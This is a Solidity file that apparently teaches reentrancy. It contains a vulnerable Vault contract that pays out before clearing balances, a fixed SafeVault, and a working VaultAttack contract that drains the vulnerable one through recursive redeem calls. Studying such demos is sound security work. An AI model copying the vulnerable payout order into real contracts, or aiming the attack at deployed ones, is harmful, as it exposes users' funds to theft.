// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "@openzeppelin/contracts/utils/Strings.sol";

contract Vault {
    mapping(address => uint) public balances;
 
    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender] += msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        (bool sent, bytes memory data) = msg.sender.call{ value: balances[msg.sender] }("");
        require(sent, "redeem fails on transfert");
        balances[msg.sender] = 0;
    }
}


contract SafeVault {
    mapping(address => uint) public balances;
 
    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender] += msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        require(balances[msg.sender] > 0, "no money");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, bytes memory data) = msg.sender.call{ value: amount }("");
        require(sent, string.concat("redeem fails on transfert: ", Strings.toString(amount)));
    }
}


contract VaultAttack {
    Vault private _target;
    address private _owner;

    constructor(address target) {
        _target = Vault(target);
        _owner = msg.sender;
    }

    function drain() private {
        if (address(_target).balance > 0 ether) 
            _target.redeem();
        else
            _owner.call{ value:  address(this).balance}("");
    }

    function attack() payable external {
        _target.store{value: msg.value}();
        drain();
    }

    receive() payable external {
        drain();
    }

    fallback() payable external {
        drain();
    }
}
